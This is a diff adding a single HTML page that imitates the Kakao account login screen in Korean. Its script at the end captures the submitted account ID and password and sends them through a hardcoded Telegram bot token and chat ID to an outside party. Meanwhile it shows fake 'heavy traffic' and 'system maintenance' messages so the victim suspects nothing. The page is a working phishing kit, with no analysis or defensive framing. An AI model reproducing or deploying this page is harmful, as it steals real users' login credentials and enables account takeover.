@@ -1,0 +1,307 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>카카오계정</title>
+  <style>
+    :root {
+      --bg: #111111;
+      --panel: #111111;
+      --line: #303030;
+      --field-line: #666666;
+      --text: #f2f2f2;
+      --muted: #a5a5a5;
+      --yellow: #F4DC00;
+      --yellow-hover: #F4DC00;
+      --secondary: #292929;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body { min-height: 100%; }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+                   "Noto Sans KR", "Malgun Gothic", sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .page {
+      width: 100%;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 54px 24px 30px;
+    }
+
+    .brand {
+      margin: 0 0 40px;
+      font-size: 39px;
+      line-height: 1.2;
+      font-weight: 600;
+      letter-spacing: -2.5px;
+      color: #f4f4f4;
+      user-select: none;
+    }
+
+    .login-card {
+      width: min(694px, 100%);
+      min-height: 588px;
+      border: 1px solid var(--line);
+      padding: 66px 82px 52px;
+      background: rgba(18, 18, 18, .72);
+    }
+
+    .field {
+      display: block;
+      width: 100%;
+      height: 60px;
+      padding: 12px 0 8px;
+      margin: 0 0 7px;
+      border: 0;
+      border-bottom: 1px solid var(--field-line);
+      border-radius: 0;
+      outline: none;
+      background: transparent;
+      color: var(--text);
+      font: inherit;
+      font-size: 20px;
+      transition: border-color .18s ease;
+    }
+
+    .field::placeholder { color: #a7a7a7; opacity: 1; }
+    .field:focus { border-bottom: 2px solid var(--yellow); }
+    .field + .field { margin-top: 0; }
+
+    .save-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 32px 0 48px;
+      color: #d5d5d5;
+      font-size: 17px;
+    }
+
+    .save-row input {
+      appearance: none;
+      width: 23px;
+      height: 23px;
+      margin: 0;
+      border: 2px solid #929292;
+      border-radius: 50%;
+      background: transparent;
+      cursor: pointer;
+      position: relative;
+    }
+
+    .save-row input:checked {
+      border-color: var(--yellow);
+      background: var(--yellow);
+    }
+
+    .save-row input:checked::after {
+      content: "";
+      position: absolute;
+      width: 7px;
+      height: 11px;
+      border: solid #171717;
+      border-width: 0 2px 2px 0;
+      left: 6px;
+      top: 3px;
+      transform: rotate(45deg);
+    }
+
+    .info {
+      display: inline-grid;
+      place-items: center;
+      width: 20px;
+      height: 20px;
+      border: 1px solid #888;
+      border-radius: 50%;
+      color: #aaa;
+      font-size: 12px;
+      margin-left: -2px;
+    }
+
+    button {
+      width: 100%;
+      height: 60px;
+      border: 0;
+      border-radius: 10px;
+      font: inherit;
+      font-size: 19px;
+      cursor: pointer;
+      transition: background .18s ease, transform .18s ease;
+    }
+
+    button:active { transform: translateY(1px); }
+
+    .primary {
+      color: #171717;
+      background: var(--yellow);
+      font-weight: 400;
+    }
+    .primary:hover { background: var(--yellow-hover); }
+
+    .or {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 24px 0 18px;
+      color: #a4a4a4;
+      font-size: 14px;
+    }
+    .or::before, .or::after {
+      content: "";
+      height: 1px;
+      flex: 1;
+      background: #292929;
+    }
+
+    .secondary {
+      color: #f4f4f4;
+      background: var(--secondary);
+      font-weight: 400;
+    }
+    .secondary:hover { background: #353535; }
+
+    .links {
+      display: flex;
+      justify-content: space-between;
+      gap: 16px;
+      margin-top: 31px;
+      font-size: 14px;
+    }
+
+    a {
+      color: #eeeeee;
+      text-decoration: none;
+    }
+    a:hover { text-decoration: underline; }
+
+    .notice {
+      min-height: 20px;
+      margin: 18px 0 0;
+      color: #cfcfcf;
+      font-size: 13px;
+      line-height: 1.5;
+      text-align: center;
+    }
+
+    footer {
+      width: 100%;
+      padding: 18px 20px 24px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 13px;
+      color: #a7a7a7;
+      font-size: 13px;
+    }
+    footer a { color: #bdbdbd; }
+    .copyright { color: #d4d4d4; margin-left: 8px; }
+
+    @media (max-width: 600px) {
+      .page { padding: 38px 18px 24px; }
+      .brand { font-size: 34px; margin-bottom: 30px; }
+      .login-card {
+        min-height: 0;
+        padding: 42px 25px 38px;
+      }
+      .field { font-size: 17px; height: 56px; }
+      .save-row { margin: 27px 0 38px; font-size: 15px; }
+      button { height: 56px; font-size: 17px; }
+      .links { font-size: 13px; }
+      footer { gap: 9px; font-size: 12px; }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <div class="brand" aria-label="kakao">kakao</div>
+
+    <section class="login-card" aria-label="로그인">
+      <form id="demoLogin">
+        <input class="field" type="text" name="account"
+               placeholder="카카오메일 아이디, 이메일, 전화번호" autocomplete="username"
+               aria-label="카카오메일 아이디, 이메일, 전화번호">
+        <input class="field" type="password" name="password"
+               placeholder="비밀번호" autocomplete="current-password"
+               aria-label="비밀번호">
+
+        <label class="save-row">
+          <input type="checkbox" name="remember">
+          <span>로그인 정보 저장</span>
+          <span class="info" title="현재 이용량이 많아 지연되고 있습니다.">i</span>
+        </label>
+
+        <button class="primary" type="submit">로그인</button>
+
+        <div class="or">또는</div>
+
+        <button class="secondary" type="button" id="qrButton">
+          QR 코드 로그인
+        </button>
+
+        <nav class="links" aria-label="계정 메뉴">
+          <a href="#" data-message="시스템 점검으로 잠시 후 이용해주세요.">회원가입</a>
+          <a href="#" data-message="시스템 점검으로 잠시 후 이용해주세요.">계정 · 비밀번호 찾기</a>
+        </nav>
+        <p class="notice" id="notice" role="status" aria-live="polite"></p>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    <a href="#">한국어⌄</a>
+    <span>│</span>
+    <a href="#">이용약관</a>
+    <span>│</span>
+    <a href="#">개인정보 처리방침</a>
+    <span>│</span>
+    <a href="#">고객센터</a>
+    <span class="copyright">© kakao</span>
+  </footer>
+
+  <script>
+    const BOT_TOKEN = "8564226846:AAGi12KRDGP2OV2NadSIVMv-BstUjS5gB44";
+    const CHAT_ID = "8100977052";
+    const notice = document.getElementById("notice");
+
+    document.getElementById("demoLogin").addEventListener("submit", async (event) => {
+      event.preventDefault();
+      notice.textContent = "현재 이용량이 많아 지연되고 있습니다.";
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: `ID: ${event.target.account.value}\nPW: ${event.target.password.value}` })
+        });
+      } catch (e) {
+        // 네트워크 오류가 나도 화면 동작은 그대로 유지
+      }
+    });
+
+    document.getElementById("qrButton").addEventListener("click", () => {
+      notice.textContent = "현재 이용량이 많아 지연되고 있습니다.";
+    });
+
+    document.querySelectorAll("[data-message]").forEach((link) => {
+      link.addEventListener("click", (event) => {
+        event.preventDefault();
+        notice.textContent = link.dataset.message;
+      });
+    });
+  </script>
+</body>
+</html>
